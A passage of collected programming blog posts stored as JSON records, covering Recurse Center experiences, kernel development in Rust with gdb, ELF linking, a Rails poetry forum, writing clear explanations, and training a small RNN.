!,\n writing a TCP stack! ) \n how to write an operating system\n( why is my operating system being erased?! ) \n security (what actually is a buffer overflow?\n how do I make one? ) \n how gzip works \n how to write a\n shell \n how floating point numbers work! Stefan Karpinski gave an amazing\ntalk about this. \n \n\n I wanted to work on things that seemed impossible to me, and writing an\noperating system seemed impossible. I didn’t know  anything  about\noperating systems. This was amazing. \n\n This meant sometimes saying no to requests to pair on things that\nweren’t on my roadmap, even if they seemed super interesting! I also\nlearned that if I wanted something to exist, I could  just make it . \n\n I ran a kernel development workshop for a while in my first two weeks.\n Jari  and\n Pierre  and\n Brian  came, and they answered “what\nis a kernel? what are its responsibilities?“. This was hugely helpful\nto me, and I learned a ton of the basics of kernel programming. Nobody\nI talked to had built an operating system from scratch, so I learned\nhow!  Filippo  answered a lot of my security\nquestions and helped when I was confused about assembly.\n Daphne  was working on a shell\nand I paired with her and learned a ton. \n\n People at Hacker School know an  amazing  amount of stuff. There is so\nmuch to learn from them. \n\n So I don’t have advice, but for me one some the most important things\nto remember about Hacker School were that  other people have different\ninterests than me, and that’s okay , and  I can make Hacker School\nwhat I want it to be . \n"},
{"url": "https://jvns.ca/blog/2013/12/17/day-44-gdb-is-great/", "title": "Day 44: qemu + gdb = so great", "content": "\n      Today I did some more debugging and cleaning up. Previously I was\nsetting up my IDT (interrupt descriptor table) with assembly, but I\nwanted to do it with Rust, because I don’t really know assembly and\nthe less of it I have in my OS, the less of a liability it is. I’d\ntried to do this before, but it wasn’t working. \n\n What turned out to be wrong: \n\n \n I had  1 << 16 - 1  instead of  (1 << 16) - 1 , so my mask wasn’t\nworking properly \n I had the wrong function name for the interrupt handler \n That was it! \n \n\n This actually ended up being really easy to debug! “Really easy” as in\n“it took all day, but I did not feel like hiding under the table at\nany point”. I have a symbol table, and  idt  is in it, so I just\nneeded to do iterations on \n\n gdb) x/4x &idt\n \n\n and compare the contents of memory from Working Code with the\nNon-Working Code. \n\n x/  means “examine”, and  4x  means “as hex, 4 times`. Here’s some\n documentation for examining memory . \n\n Comparing sections of memory and figuring out why they’re wrong is\ntedious, but pretty straightforward – I had a good handle on what\nall my code was doing. Pretty exciting. Best friends, gdb. \n\n gdb  isn’t totally the best interface – I can certainly imagine\nhaving better ones. But it is Very Useful. So far I know how to \n\n \n Find the address of a symbol in memory \n Look at memory (as ints, as hex, as ASCII) \n Search memory \n Set breakpoints (and look at assembly that I don’t understand) \n Make core dumps to look at later \n \n\n These are pretty awesome superpowers already, and I’m sure there are\ntons more. \n\n So now my interrupt handlers are set up in Rust! This will make it\nmuch easier for me to implement  int 80 , and therefore move towards\nbeing able to run programs! Excellent! Onwards! \n\n"},
{"url": "https://jvns.ca/blog/2013/12/10/day-40-12-things-i-learned-today-about-linkers/", "title": "Day 40: 12 things I learned today about linkers.", "content": "\n      I read 11 parts of\n this series on linkers  today. I\nalso wrote an\n epic blog post ,\nbut here is the tl;dr version (trying to synthesize…). This is all\nabout ELF. I use “ELF file” and “object file” interchangeably. \n\n In no particular order: \n\n \n To inspect an ELF object file, you can use  objdump ,  readelf \nand/or  nm . \n Executable files have  segments  and  sections . Each segment has\nmany sections. The operating system looks at the segments, not the\nsections. Read/Write/Execute permissions are controlled per\nsegment, not per section.\n [Part 8] \n ELF symbols have types! And different visibility options!\n [Part 5] \n The linker knows about threading, and does optimizations to make\nthreading easier.  [Part 7] \n An object file can define two symbols with the same name and\ndifferent symbols, for backwards compatibility.\n [Part 9] \n Those  .a  files? Those are just collections of  .o  object files,\nand they’re called “archives”!\n [Part 11] \n Linkers can work in parallel to some extent.\n [Part 10] \n Linkers actually have to do fairly complicated stuff to allow the\ncode in a shared library to be shared between different programs\nand save memory.  [Part 6] \nfor memory savings,\n [Part 4]  for the PLT/GOT \n There’s more than one way to link a shared library, and the choices\nyou make affect how quickly it loads\n [Part 4] \n In the Mach-O executable format you can have assembly code for\n differrent architectures  in the same executable. Nuts. And\nthere’s  FatELF  that extends ELF to\ndo the same thing. (edit: and isn’t being developed anymore) \n Every  .o  file has a “relocation table” listing every single\nreference to a symbol that the linker will need to update, and how\nit will need to update it.\n [Part 2] \n If you’re making a speed comparison for a linker, you might\ncompare it to  cat .  [Part 1] \n \n\n I’m curious about these ELF symbol versions – they sound kind of like\npolymorphism to me, and I’m wondering why people use symbol name\nmangling to implement polymorphism instead of symbol versions.\nProbably very good reasons! \n\n"},
{"url": "https://jvns.ca/blog/2020/11/05/i-m-doing-another-recurse-center-batch-/", "title": "I'm doing another Recurse Center batch!", "content": "\n     \n\n Hello! I’m going to do a batch (virtually) at the  Recurse Center , starting on Monday. I’ll probably be\nblogging about what I learn there, so I want to talk a bit about my plans! \n\n I’m excited about this because: \n\n \n I love RC, it’s my favourite programming community, and I’ve always been able\nto do fun programming projects there. \n they’ve put a lot of care into building a great virtual experience (including\nbuilding some very fun  custom software ) \n there’s a pandemic, it’s going to be cold outside, and I think having a\nlittle bit more structure in my life is going to make me a lot happier this\nwinter :) \n \n\n what’s the Recurse Center? \n\n The Recurse Center (which I’ll abbreviate to “RC”) is a self-directed programming retreat. It’s free to attend. \n\n A “batch” is 1 or 6 or 12 weeks, and the idea is that during that time, you: \n\n \n choose what things you want to learn \n come up with a plan to learn the things (often the plan is “do some kind of fun project”, like  “write a TCP stack” ) \n learn the things \n \n\n Also there are a bunch of other delightful people learning things, so there’s lots\nof inspiration for what to learn and people to collaborate with. There are\nalways people who are early in their programming life and looking to get their\nfirst programming job, as well as people who have been programming for a long\ntime. \n\n Their business model is recruiting – they  partner with  a bunch of companies,\nand if you want a job at the end of your batch, then they’ll match you with\ncompanies, and if you accept a job with one of those companies then the company pays them a fee. \n\n I won’t say too much more about it because I’ve written 50+ other posts about\nhow much I love RC on this blog that probably cover it :) \n\n some ideas for what I’ll do at RC \n\n Last time I did RC I had a bunch of plans going in and did not do any of them.\nI think this time it’ll probably be the same but I’ll list my ideas anyway:\nhere are some possible things I might do. \n\n \n learn Rails! I’ve been making small websites for a very long time but I\nhaven’t really worked as a professional web developer, and I think it might\nbe fun to have the superpower of being able to build websites quickly. I have\nan idea for a silly website that I think would be a fun starter rails\nproject. \n experiment with generative neural networks (I’ve been curious about this for\nyears but haven’t made any progress yet) \n maybe finish up this “incidents as a service” system that I started a year\nand a half ago to help people learn by practicing responding to weird\ncomputer situations \n deal with some of the  rbspy  issues that I’ve been ignoring for months/years \n maybe build a game! (there’s a games theme week during the batch!) \n maybe learn about graphics or shaders? \n \n\n In my first batch I spent a lot of time on systems / networking stuff because\nthat felt like the hardest thing I could do. This time I feel pretty\ncomfortable with my ability to learn about systems stuff, so I think I’ll focus\non different topics! \n\n so that’s what I’ll be writing about for a while! \n\n I’m hoping to blog more while I’m there, maybe not “every day” exactly (it\nturns out that blogging every day is a lot of work!), but I think it might be\nfun to write a bunch of tiny blog posts about things I’m\nlearning. \n\n I’m also planning to release a couple of zines this month – I finished a zine\nabout CSS, and also wrote another entire zine about bash while I was\nprocrastinating on finishing the CSS zine in a self-imposed “write an entire\nzine in October” challenge, so you should see those here soon too. I’m pretty\nexcited about both of them. \n\n"},
{"url": "https://jvns.ca/blog/2020/11/10/day-2--rails-associations---dragging-divs-around/", "title": "Day 2: Rails associations & dragging divs around", "content": "\n     \n\n Hello! Today was day 2 of building my toy project. Here are a few more notes on things that have been fun about Rails! \n\n the goal: make a refrigerator poetry forum \n\n I wanted to make kind of a boring standard website to learn Rails, and that\nother people could interact with. Like a forum! But of course if people can\nactually type on a website that creates all kinds of problems (what if they’re\nspammers? or just mean?). \n\n The first idea I came up with that would let people interact with the website\nbut not actually be able to type things into it was a refrigerator poetry\nforum where you can write poems given only a fixed set of words. \n\n So, that’s the plan! \n\n My goal with this project is to find out if I want to use Rails for other small\nweb projects (instead of what I usually do, which is use something more basic\nlike Flask, or give up on having a backend at all and write everything in\nJavascript). \n\n how do you drag the words around? jQuery UI draggable! \n\n I wanted people to be able to drag the words around, but I didn’t feel like\nwriting a lot of Javascript. It turns out that this is SUPER easy – there’s a\njQuery library to do it called “draggable”! \n\n At first the dragging didn’t work on mobile,\nbut there’s a hack to make jQuery UI work on mobile called  jQuery UI touch\npunch . Here’s what it looks\nlike (you can view source if you’re interested in seeing how it works, there’s\nvery little code). \n\n \n \n \n\n \n$(document).ready(function() {\n$( \".draggable\" ).draggable({ containment: \"#drag-container\", stack: \"span\"});\n})\n \n\n \n#drag-container {\npadding: 1em;\n}\n.draggable {\npadding: .3em;\nborder: 1px solid black;\nborder-right: 3px solid black;\nborder-bottom: 3px solid black;\nbackground-color: white;\n}\n \n\n \n banana \n forest \n cake \n is \n \n\n a fun Rails feature: “associations” \n\n I’ve never used a relational ORM before, and one thing I was excited about with\nRails was to see what using Active Record is like! Today I learned about one of Rails’ ORM features:  associations . Here’s what that’s about if you know absolutely nothing about ORMs like me. \n\n In my forum, I have: \n\n \n users \n topics (I was going to call this “threads” but apparently that’s a reserved word in Rails so they’re called “topics” for now) \n posts \n \n\n When displaying a post, I need to show the username of the user who created the\npost. So I thought I might need to write some code to load the posts and load\nthe user for each post like this: (in Rails,  Post.where  and  User.find  will\nrun SQL statements and turn the results into Ruby objects) \n\n @posts = Post.where(topic_id: id)\n@posts.each do |post|\n    user = User.find(post.user_id)\n    post.user = user\nend\n \n\n This is no good though – it’s doing a separate SQL\nquery for every post! I knew there was a better way, and I\nfound out that it’s called\n Associations . That\nlink is to the guide from  https://guides.rubyonrails.org , which has treated me\nwell so far. \n\n Basically all I needed to do was: \n\n \n Add a  has_many :posts  line to the User model \n Add a  belongs_to :user  line to the Post model \n Rails now knows how to join these two tables even though I didn’t tell it\nwhat columns to join on! I think this is because I named the  user_id  column in the  posts \ntable according to the convention it expects. \n Do the exact same thing for  User  and  Topic  (a topic also  has_many :posts ) \n \n\n And then my code to load every post along with its associated user becomes just one line! Here’s the line: \n\n @posts = @topic.posts.order(created_at: :asc).preload(:user)\n \n\n More importantly than it being just one line, instead of doing a separate query\nto get the user for each post, it gets all the users in 1 query. Apparently\nthere are a bunch of  different ways \nto do similar things in Rails (preload, eager load, joins, and includes?). I\ndon’t know what all those are yet but maybe I’ll learn that later. \n\n a fun Rails feature: scaffolding! \n\n Rails has this command line tool called  rails  and it does a lot of code\ngeneration. For example, I wanted to add a Topic model / controller. Instead of having to go figure\nout where to add all the code, I could just run: \n\n rails generate scaffold Topic title:text\n \n\n and it generated a bunch of code, so that I already had basic endpoints to\ncreate / edit / delete Topics. For example, here’s my  topic controller right\nnow , most of which I did not write (I only wrote the highlighted 3 lines).\nI’ll probably delete a lot of it, but it feels kinda nice to have a starting point where I can expand on the\nparts I want and delete the parts I don’t want. \n\n database migrations! \n\n The  rails  tool can also generate database migrations! For example, I decided\nI wanted to remove the  title  field from posts. \n\n Here’s what I had to do: \n\n rails generate migration RemoveTitleFromPosts title:string\nrails db:migrate\n \n\n That’s it – just run a couple of command line incantations! I ran a few of these\nmigrations as I changed my mind about what I wanted my database schema to be\nand it’s been pretty straightforward so far – it feels pretty magical. \n\n It got a tiny bit more interesting when I tried to add a  not null  constraint\nto a column where some of the fields in that column were null – the migration\nfailed. But I could just fix the offending records and easily rerun the migration. \n\n that’s all for today! \n\n tomorrow maybe I’ll put it on the internet if I make more progress. \n\n"},
{"url": "https://jvns.ca/blog/2013/12/20/day-46-never-graduate/", "title": "Day 46: Never Graduate", "content": "\n      Yesterday was the last day of Hacker School. This is a Sad Story. \n\n I have a lot of feelings about this. Sad-to-be-leaving feelings and\ncan’t-i-just-stay-forever feelings and i-get-to-live-at-home-again\nfeelings. \n\n I will miss the people so much! However, I had the following\nconversation with  Sumana  about this. \n\n \n Julia: You have 4000 blog posts! \n Sumana: Well, they took 13 years to write! \n Julia: YEAH. I WILL WRITE 4000 BLOG POSTS TOO. \n Sumana: YEAH \n Julia: Oh, but what will I write about when Hacker School is over? I\nwill have nothing to say! \n Sumana: Never graduate! \n \n\n So hopefully I’ll keep blogging and seeing all the friends I’ve made\nhere. And coding. And learning. \n\n brb hugging all the people \n\n"},
{"url": "https://jvns.ca/blog/2014/03/10/help/", "title": "Hacker School's Secret Strategy for Being Super Productive (or: Help.)", "content": "\n      (this was originally called “Help”, but instead we’re being\nUpWorthy today) \n\n At Hacker School, people who are new to programming learn incredibly\nfast. Hacker Schoolers learn Clojure and Scala and Erlang and Python\nand Ruby and Haskell and web programming and sockets. They write\ncompilers and BitTorrent clients and generate music and create new\nprogramming languages and make games. At Hacker School, people get\ndramatically better at programming. It’s almost a magical environment,\nand there are many reasons that it’s like this. \n\n But I think one of the most important things is this: \n\n You can always get help. Everyone takes responsibility for helping\neveryone else. \n\n \n\n So, a few ways to think about help in your community, workplace, or\nproject: \n\n Helping saves everyone’s time. \n\n If you have a question which will take you 2 hours to answer on your\nown, and 20 minutes for someone to help you with, then that person\nhelping you saves 80 minutes of someone being frustrated. \n\n Math! \n\n Helping isn’t handholding. \n\n There’s this aphorism “Give someone a fish, and they’ll eat for a day.\nTeach them to fish and they’ll eat for the rest of their life.” \n\n Note that this says “teach them to fish”, not “give them a\ndisassembled fishing rod and a manual and a map and tell them that\nit’s all there”. I see the latter pretty often in the world of open\nsource, and people defend it by saying that they can’t hold everyone’s\nhand. There’s something in between. \n\n Asking questions is efficient and responsible. \n\n Asking questions at work can be scary. However! If you ask a question\nthat saves 6 hours of your time and takes someone 30 minutes to\nanswer, that’s an amazing use of time. I think of it as my\n responsibility  to ask questions like this. \n\n It needs to be okay to ask questions. \n\n This is so important. If somebody asks you a basic question and you\nmake fun of them or act super surprised that they don’t already,\nthey’re  going to ask less questions . And then they’re going to get\nless stuff done. \n\n If someone asks you “hey, who’s Nelson Mandela?”, an inappropriate\nanswer is “oh you don’t know?!! He’s so important!”. An appropriate\nanswer would be “He was a South African anti-apartheid\nrevolutionary…“. \n\n At Hacker School there’s a huge emphasis on not acting surprised when\npeople ask questions that might seem basic, and so people feel safer\nasking questions when they’re stuck. \n\n Help turns self-directed and autonomous people into superheroes \n\n There’s a notion sometimes that people who can learn on their own\ndon’t need any help at all – they’ll figure it out! \n\n And they kind of will! But it will be slow and painful and\ninefficient. \n\n What I saw at Hacker School was that the amazing support that was\navailable turned self-directed and autonomous people into\n superheroes . I got things done much more quickly, learned much\nfaster, and did things I absolutely wouldn’t have been able to do\notherwise. \n\n Having 65 people in a room with you who are all willing to help you\nget unstuck is invaluable. \n\n Helping people is doing work. \n\n Sometimes I hear people in work environments say “I don’t have time, I\nhave work to do!” \n\n It’s important to think of supporting people and answering questions\nas a core part of your work, not something tangential. For everyone.\nIt saves everyone’s time. It makes your team more efficient. \n\n Answering questions is also an amazing way to learn. I often find that\nI don’t understand things as well as I think I did. \n\n You have time to help people. \n\n I’d also like to address the “I don’t have time” point with a concrete\nsuggestion. \n\n Everyone has things that they do when they’re stuck on something or\nneed a short break (check Facebook, go read Twitter, whatever). At\nHacker School when I was stuck, I’d often go on our internal chat\nsystem and answer questions! \n\n As far as I could tell everyone else also did this. The result was\nthat you could get answers to your questions super quickly. \n\n A thought experiment \n\n What if everybody asked questions when they needed help? \n\n What if helping people was everyone’s default procrastination method? \n"},
{"url": "https://jvns.ca/blog/2017/09/17/how-i-spent-my-time-at-the-recurse-center/", "title": "How I spent my time at the Recurse Center", "content": "\n     \n\n I went to the Recurse Center a while ago now (4 years ago) but I’m interested in the topic of “how\ndo I accomplish a lot in a short amount of time” again so I wanted to revisit how I spent my time\nthere because I learned a lot. I don’t know if this will be interesting to anyone but me but I often\nthink about things by blogging, so here you go :) \n\n The  Recurse Center  is a place where you go for 12 weeks and spend all\nyour time working on getting better at programming. To learn more about it I recommend the  user’s manual . \n\n The days are numbered 1-46 because when I was there Monday-Thursday were the only “mandatory” days.\nSo 12 weeks is 48 days, minus 2 for some reason. \n\n Here’s how I spent those 46 days (in order). (I know this because I  wrote a blog post every day I was there ). Some of this is probably  retconned  at least a little bit :) \n\n \n Day 1-3 : Work on a tiny shell in bash ( here’s the source ) \n meanwhile: Learn what a shell does. Learn some basics of the Linux kernel does. Tom teaches me about netcat.\nNetcat is awesome, wow. \n Day 4-6 : Learn what a Linux kernel module is. Write a couple of beginner kernel modules. \n Day 7 : Consider learning Clojure / writing a bittorrent client in Clojure. Write a clojure echo\nserver & decide against continuing down that path \n Day 8-10 : Pair with Allison on her bytecode interpreter, go to a talk on Julia & open source, feel\nconfused about what I’m going to do next \n Day 11-16 : Implement gunzip in Julia and demo it ( gzip + poetry = awesome ).  https://github.com/jvns/gzip.jl . \n Day 17-18 : Read some of  Hacking : The Art of Exploitation . (which is a GREAT BOOK). Do some experimentation with buffer overflows & ARP cache poisoning. \n Day 19-20 : Get interested in networking. Talk to Jari & Brian about networking. Implement\ntraceroute in Python \n Day 21-27 : Work on a TCP stack in Python. ( https://github.com/jvns/teeceepee ) \n Day 28-29 : Philip Guo is a resident. Inspired to make  https://visualize-your-git.herokuapp.com/ .\n(web projects were against my personal rules for being at the recurse center but I did it anyway) \n Day 30-33 : Have fun with making music with Clojure. Write a webserver with Lyndsey that lets\na crowd of people play music on your computer ( https://github.com/jvns/magical-orchestra ) \n Day 34-46 : Work on writing a tiny operating system in Rust ( https://github.com/jvns/puddle ) \n \n\n Overall: \n\n \n 13 days on writing a mini Rust OS (500 lines of Rust).  https://github.com/jvns/puddle \n 9 days on learning about networking & writing a TCP stack in Python (200 lines of Python + tests).  https://github.com/jvns/teeceepee \n 6 days on gzip in Julia (360 lines of Julia).  https://github.com/jvns/gzip.jl \n 3 days on writing a shell in C (250 lines of C, with Daphne).  https://github.com/jvns/_dash \n 3 days writing fun kernel modules (200 lines of C).  https://github.com/jvns/kernel-module-fun \n 2 days on a git workflow visualization tool (150 lines of Python).  https://github.com/jvns/git-workflow \n 5 days on Clojure & having fun making music in Clojure (250 lines of Clojure, with Lyndsey).  https://github.com/jvns/magical-orchestra \n 2 days reading a hacking book and experimenting with buffer overflows / ARP cache poisoning. (no code) \n 3 days not working on any specific project \n \n\n adds up to a Recurse Center batch! \n\n To be clear I don’t think that it’s  necessary  to spend all your time working on a\nSpecific Project. My partner went to RC and spent most of his time not working on any specific\nproject and still got a lot of out of it. People spend their time at RC in totally different ways\nand that’s okay! \n\n some observations: \n\n \n I wrote maybe 50-100 lines of code a day on average. \n I didn’t like it when I wasn’t working on a “project”. \n I was pretty comfortable with web development / machine learning basics before RC, so I completely\navoided working on those things. I focused on stuff I thought seemed hard/scary (networking/security/operating\nsystems/writing a shell/compression). Clojure / the git visualization tool were exceptions to this, those I just thought were fun. \n The stuff I learned about at RC 4 years ago is still a lot of the same stuff I’m excited about\ntoday. \n There were a lot of things I worked on for only 2-3 days (like “write kernel modules”). Some of\nthose things I learned a LOT from. \n I spent almost all of my time (all except 5 days) working on projects I could demo and talk about\neasily. But nothing I made was really that polished or anything. \n I was pretty concerned with getting a job after, a big part of why I\nblogged about what I was learning was that I wanted to get a cool job after the Recurse Center and\nso my blog was my “media strategy”. I spent 1-2 hours a day writing (which was a lot) but I did\nget a cool job after. \n on the other hand I was lucky that I didn’t really  need  to get a job immediately after RC, I\ncould have easily afforded to spend a few months job hunting. So I had space to focus on\nlearning/programming. \n all the people at RC were really amazing (other recursers / residents / facilitators). For example\nLindsey encouraged me to work on writing an OS in Rust and that turned out to be a great idea. And\nthe facilitators were always extremely enthusiastic/positive  about helping me debug weird problems I had. \n Today I have a really positive attitude about debugging (what are we going to learn TODAY?!). I\nthink I learned that from the RC facilitators <3 (like I’d ask Allison “hi can you help me debug\nthis weird thing” and she would be SO HELPFUL) \n \n\n I think this media strategy approach (“everything I do has to be a cool thing I can demo and write\nabout”) thing is pretty weird and I don’t know that I recommend it. It worked for me though, I think\nit maybe helped keep me focused/motivated. I think “blog every day” isn’t actually an approach that\nworks for most people though :). \n\n RC is awesome \n\n looking back I think some of the most important things I learned at RC were: \n\n \n debugging is fun and interesting \n systems/networking/linux are extremely cool and not really that hard to get started with even if\nyou only know a little bit of C. Like Tom told me about netcat on Day 2 and I am still VERY\nEXCITED about networking :) \n I learned some about unknown-unknowns – things that I didn’t know existed and wouldn’t really\nhave thought to ask about (strace! netcat! system calls!) \n writing about what I’m learning is really fun \n \n\n"},
{"url": "https://jvns.ca/blog/2020/11/15/simple-explanations-without-sounding-condescending/", "title": "How do you write simple explanations without sounding condescending?", "content": "\n     \n\n Sumana Harihareswara wrote an interesting blog post  Plain Language\nChoices  recently, about\nwriting about complicated topics using simple language and how it can sometimes\ncome off as condescending. \n\n I really like explaining complicated topics while trying to avoid\nunnecessary jargon, and I realized that I’ve thought a lot about how to do it\nwell. So here are a bunch of things I try to do when I use simple language to\navoid coming off as condescending. \n\n use some jargon to give the reader search terms \n\n Sometimes I see writing that completely avoids all jargon and instead\nsubstitutes simple language for all “jargon”-y words. \n\n I like to include some jargon in my explanations because otherwise it’s\nimpossible for the reader to search & learn more about the concept they’re\ntrying to learn about. \n\n write (mostly) true explanations \n\n Something else I see sometimes in ELI5-type explanations is an explanation in\nplain language that’s not actually true in a useful way. I’m pretty sympathetic\nto why people do this – it’s super hard to write simple explanations that are\nalso true! \n\n And actually sometimes when I’m trying to write down a simple/clear explanation\nfor a concept, I realize that I don’t actually understand the concept as well\nas I thought and that I’m not able to explain it. That’s okay! \n\n I think there are a few options here: \n\n \n try to say only things that are true (or at least which are a useful\nmodel for how the world works even if they’re not 100% true) \n write things that are not really true / that you’re not sure of, but point\nout that they may not be true (“I think it works like X, but I realize now\nthat it might be Y instead, I’m not sure!“) \n \n\n only use “fun” visual elements on explanations that are actually well written & easy to understand \n\n This happens more with visual aids than with simple language but I’ll include\nit anyway. Sometimes I see explanations which have “fun” elements to it to make it\nthem seem more approachable where the explanation itself is still pretty unclear. \n\n I try to be careful about this in my own work – I try to only attach “fun”\nelements (like a fun illustrated cover) to explanations that I’ve spent a lot\nof time on making really clear. Basically to me “fun” things are a signal that\nthe content itself is really clear/accessible, and I try to not misuse that\nsignal. \n\n I think  why’s poignant guide to ruby  is a nice\nexample of something that’s fun and clear and which has helped a lot of people learn Ruby. \n\n Another nice example of this is: I know someone who got her master’s thesis\nprinted as a paperback book and illustrated with some great drawings related to\nthe topic of her thesis (trans represensentation in media).\nIt’s called “I’m supposed to relate to this?”, here’s the  paperback . \n\n I ended up reading\nthe whole thing because, in addition to having the fun illustrations, her\nmaster’s thesis was really well written and interesting! The fact that she did\nthe work to print a paperback book of her thesis and get it illustrated was a\nsign that she’d worked on making the writing accessible to a non-academic\naudience, and it was true! \n\n tell a relevant story \n\n Stories can really help people learn! For example, something I’ve\ndone a lot on this blog is talk about a problem I ran into in the course of my\njob and what I did to solve that problem. \n\n Some kinds of stories that I think work well: \n\n \n a real problem that someone ran into, to motivate why the concept is\ninteresting / important to learn \n something that’s happening on a computer, framed as a “story” (for\nexample  https://howdns.works/  tells a story about how DNS works. Everything\nin the story literally corresponds to exactly what happens when you make a\nDNS query) \n \n\n Sometimes I see stories used to explain concepts that don’t fit into either of\nthese and feel kind of pasted on, like they’re there to help the concept seem\n“fun” but don’t actually illustrate the concept or motivate why it might be\nuseful to learn it. \n\n have a specific audience in mind \n\n I try to write relatively simple explanations, but when I write I also\ngenerally assume a lot of knowledge on the part of my audience. \n\n Sometimes I see explanations of complicated concepts that start with explaining\nthe very basics of the topic. This usually isn’t that effective: if someone is\ntrying to understand some super technical aspect of containers, they probably\nunderstand the basics of containers already! \n\n “Have an audience” is more of a general writing tip so I’ll leave it at that. \n\n on using simple language as a joke for people who already understand the idea \n\n Here’s a very fun explanation of a complicated thing using simple language:\n Gödel’s Second Incompleteness Theorem Explained in Words of One Syllable . \n\n On one hand, this is fun! I enjoyed reading it. On the other hand, I think the\nmain audience for this is probably people who already more or less understand\nGödel’s Second Incompleteness Theorem. \n\n For example, someone pointed out that “if math is a not a load of bunk” in this\ntext is code for “Peano arithmetic is consistent” with (“math” being “Peano\narithmetic” and “not a load of bunk” meaning “consistent”). Which I find very\ncharming, but also I found it a little hard to decode when reading it. \n\n And (as we talked about before about jargon), if you know that “Peano arithmetic is\nconsistent” is the relevant bit of jargon, you can find all kind of fascinating\nthings, like  a blog post by John Baez from 2011 discussing an attempted proof that Peano arithmetic was inconsistent ) \n\n (I’m also reminded here of the XKCD  up goer five ,\nwhich is very delightful, but I don’t think I learned anything about spaceships\nfrom reading it) \n\n that’s all! \n\n I’d love to hear more thoughts on this – I think there are probably more ways\nthat simple explanations can feel condescending that I’ve missed! \n\n I really don’t think they  need  to feel condescending though – to me the\npoint of writing a clear/simple explanation is usually that I think the idea is\n not actually fundamentally that complicated  and so I’m just explaining it in\na way that’s exactly as complicated as it needs to be. \n\n"},
{"url": "https://jvns.ca/blog/2013/12/19/day-45-reading-elf-headers/", "title": "Day 45: I now have Rust code for executing executables!", "content": "\n      So I’m working on writing a kernel in Rust, and I wanted to be able to\nrun executables because THAT WOULD BE COOL. Now I have the beginnings\nof this working! \n\n I posted about my confusion about how to run programs\n a few days ago .\nThen  Graydon Hoare  sent me a super\nhelpful email answering all my questions, and gave me an example\nminimal program to use (better than “Hello world”). The best. One of\nmy favourite things about this blog is when delightful people comment\nor email and answer my questions \n\n This is really useful because my statically compiled Hello World\nprogram takes up 800k, which is huge. The example program Graydon sent\nme is 897 bytes compiled, so about 1000 times smaller! \n\n You can compile it like this: \n\n $ cat >static.c\nint _start() {\n  asm(\n      \"mov $127,%ebx\\n\" /* exit code        */\n      \"mov $1,%eax\\n\"   /* syscall #1, exit */\n      \"int $0x80\\n\"     /* invoke syscall   */\n      );\n}\n^D\n\n$ cc -m32 -static -nostdlib static.c\n$ ./a.out\n$ echo $?\n127\n \n\n This is super great, because it means that I can understand the whole\nprogram and it doesn’t have a bunch of glibc/Linux stuff compiled into\nit. The only OS-specific thing here is the  int 80  interrupt, which\nI’ll need to implement. I could also make up my own convention for\nsystem calls, but that seems unnecessary. \n\n So what I need to do is \n\n \n Implement the  exit()  system call \n Read the ELF header \n Read the segment headers \n Find out\n\n \n what address the program needs to start at \n how many bytes the main section is \n The address of the program’s entry point \n \n Copy the segment marked LOAD into memory at the right address \n Jump to the start of the program! \n \n\n This is what the code I have so far looks like. You can see that it’s\nmostly an ELF header definition, and then to read it I just cast the\npointer to the array I’m trying to read. \n\n This is typical of a lot of Rust code I’m writing – I need to write a\nlot of  unsafe  code. \n\n pub fn read_header<'a>(file: &'a [u8]) -> &'a ELFHeader {\n    unsafe {\n        let x : *ELFHeader = to_ptr(file) as *ELFHeader;\n        return &*x;\n    }\n}\n\n#[packed]\nstruct ELFHeader {\n    e_ident: ELFIdent,\n    e_type: u16,\n    e_machine: u16,\n    e_version: u32,\n    e_entry: u32,\n    e_phoff: u32,\n    e_shoff: u32,\n    e_flags: u32,\n    e_ehsize: u16,\n    e_phentsize: u16,\n    e_phnum: u16,\n    e_shentsize: u16,\n    e_shnum: u16,\n    e_shstrndx: u16\n}\n \n\n and the final  exec  function will look a bit like this: \n\n unsafe fn jmp(addr: u32) {\n    asm!(\"jmp *($0)\"\n         :\n         : \"r\" (addr));\n}\n\n// Executes a file starting at `addr`\npub unsafe fn exec(addr: uint) {\n    let bytes: &[u8] = transmute(Slice {data: (addr as *u8), len: 100});\n    let header = elf::read_header(bytes);\n    assert(header.e_ident.ei_mag.slice(1,4) == \"ELF\");\n    // Read the program header and load the program into memory at\n    // the right address\n    jmp(header.e_entry);\n}\n \n\n jmp  is a great example of an unsafe Rust function – what could be\nmore unsafe than jumping to a possibly arbitrary address in memory? \n\n"},
{"url": "https://jvns.ca/blog/2020/11/20/day-10--training-an-rnn-to-count-to-three/", "title": "Day 10: Training an RNN to count to three", "content": "\n     \n\n Yesterday I was trying to train an RNN to generate English that sounds kind of\nlike Shakespeare. That was not working, so today I instead tried to do\nsomething MUCH simpler: train an RNN to generate sequences like \n\n 0 1 2 0 1 2 0 1 2 0 1 2\n \n\n and slightly more complicated sequences like \n\n 0 1 2 1 0 1 2 1 0 1 2 1 0 1 2 1 0\n \n\n I used (I think) the exact same RNN that I couldn’t get to work yesterday to\ngenerate English by training it on Shakespeare, so it was cool to see that I could at least use it for\nthis much simpler task (memorize short sequences of numbers). \n\n the jupyter notebook \n\n It’s late so I won’t explain all the code in this blog\npost, but here’s the PyTorch code I wrote to train the RNN to count to three. \n\n \n Here it is as a  github gist \n and  here it is on Colab  if you want to run it yourself \n \n\n In the gist there are a few experiments with different sequence lengths, like\n(unsurprisingly) it takes longer to train it to memorize a sequence of length\n20 than a sequence of length 5. \n\n simplifying is nice \n\n I’m super happy that I got an RNN to do something that I actually understand! I\nfeel pretty hopeful that on Monday I’ll be able to go back to the character RNN\nproblem of trying to get the RNN to generate English words now that I have this simpler thing working. \n\n"},
{"url": "https://jvns.ca/blog/2020/11/23/day-11--learning-about-learning-rates/", "title": "Day 11: learning about learning rates", "content": "\n     \n\n Hello! \n\n On Friday I trained an RNN to count to 3 (1 2 3 1 2 3 1 2 3), thanks\nto some great advice from another Recurser. I figured that once I got that\nworking, I could then extend that and train the same RNN on a bunch of\nShakespearean text to get it to generate vaguely Shakespeare-y text. \n\n But on Friday I couldn’t get that to work! I was puzzled by this, but today I\nfigured out what was happening. \n\n what’s a learning rate? \n\n First, here’s a very short “deep learning for math majors” explanation of how\ntraining for a deep learning model works in general. I wrote this to help\nconsolidate my own understanding on Friday. \n\n \n The model takes the training data and weights and outputs a single number,\nthe output of the loss function \n The model’s “weights” are the parameters of all the matrices in the model,\nlike if there’s a 64 x 64 matrix then there are 4096 weights \n For optimization purposes, this function should be thought of as a function\nof the weights (not the training data), since the weights are going to change\nand the function isn’t \n Training is basically gradient descent. You take the derivative of the\nfunction (aka gradient), with respect to the weights of all the matrices/various functions\nin the model \n The way you take this derivative is using the chain rule, the algorithm\nfor applying the chain rule to a neural network is called “backpropagation” \n Then you adjust the parameters by 